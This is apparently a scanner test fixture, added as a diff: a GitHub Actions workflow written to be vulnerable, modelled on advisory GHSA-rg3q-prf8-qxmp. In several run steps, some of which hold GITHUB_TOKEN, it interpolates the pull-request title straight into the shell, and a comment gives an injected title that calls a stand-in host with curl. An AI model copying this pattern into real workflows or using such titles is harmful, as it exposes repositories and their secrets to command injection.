@@ -1,0 +1,51 @@
+# GHSA-rg3q-prf8-qxmp: Command injection via PR title in embano1/wip
+# Advisory URL: https://github.com/advisories/GHSA-rg3q-prf8-qxmp
+# Vulnerability Type: Command Injection (High)
+# Expected Detection: CodeInjectionMediumRule or ArgumentInjectionMediumRule
+#
+# Vulnerable Pattern: github.event.pull_request.title is directly used in run statement
+# Attacker can craft PR title to execute arbitrary commands
+
+name: Vulnerable WIP PR Title Injection
+
+on:
+  pull_request:
+    types: [opened, edited, synchronize]
+
+jobs:
+  check-wip:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      # Vulnerable: PR title is directly interpolated in shell command
+      - name: Check WIP status
+        run: |
+          PR_TITLE="${{ github.event.pull_request.title }}"
+          echo "Checking PR title: $PR_TITLE"
+
+          # Attacker can set title to: WIP: Fix bug $(curl http://attacker.com)
+          if echo "$PR_TITLE" | grep -i "wip"; then
+            echo "This is a WIP PR"
+            exit 1
+          fi
+
+      # Another vulnerable pattern
+      - name: Update PR label
+        run: |
+          # Direct interpolation in gh command
+          gh pr edit ${{ github.event.pull_request.number }} \
+            --add-label "status: ${{ github.event.pull_request.title }}"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      # Yet another vulnerable pattern
+      - name: Create status comment
+        run: |
+          COMMENT="PR Title: ${{ github.event.pull_request.title }}"
+          echo "$COMMENT"
+          gh pr comment ${{ github.event.pull_request.number }} --body "$COMMENT"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
